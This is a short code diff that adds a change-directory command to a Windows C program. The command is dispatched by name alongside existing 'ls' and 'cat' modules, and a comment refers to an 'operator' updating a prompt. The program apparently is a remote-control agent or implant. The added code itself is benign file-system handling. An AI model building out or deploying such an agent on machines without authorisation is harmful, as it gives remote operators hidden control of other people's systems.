@@ -316,6 +316,30 @@ void mod_ls(Buffer *out, const char *path) {
     FindClose(hFind);
 }
 
+/* ─── Module: cd (change directory) ─── */
+
+void mod_cd(Buffer *out, const char *path) {
+    if (!path || strlen(path) == 0) {
+        /* No argument — print current directory */
+        char cwd[MAX_PATH];
+        GetCurrentDirectoryA(MAX_PATH, cwd);
+        buf_append(out, cwd, (DWORD)strlen(cwd));
+        return;
+    }
+
+    if (!SetCurrentDirectoryA(path)) {
+        char err[512];
+        snprintf(err, sizeof(err), "cd: cannot access '%s' (err=%lu)\n", path, GetLastError());
+        buf_append(out, err, (DWORD)strlen(err));
+        return;
+    }
+
+    /* Return new CWD so operator can update prompt */
+    char cwd[MAX_PATH];
+    GetCurrentDirectoryA(MAX_PATH, cwd);
+    buf_append(out, cwd, (DWORD)strlen(cwd));
+}
+
 /* ─── Module: cat (read file) ─── */
 
 void mod_cat(Buffer *out, const char *path) {
@@ -509,6 +533,10 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
     else if (strcmp(name, "ls") == 0) {
         const char *path = arg_extract_str(&ap);
         mod_ls(&out, path);
+    }
+    else if (strcmp(name, "cd") == 0) {
+        const char *path = arg_extract_str(&ap);
+        mod_cd(&out, path);
     }
     else if (strcmp(name, "cat") == 0) {
         const char *path = arg_extract_str(&ap);
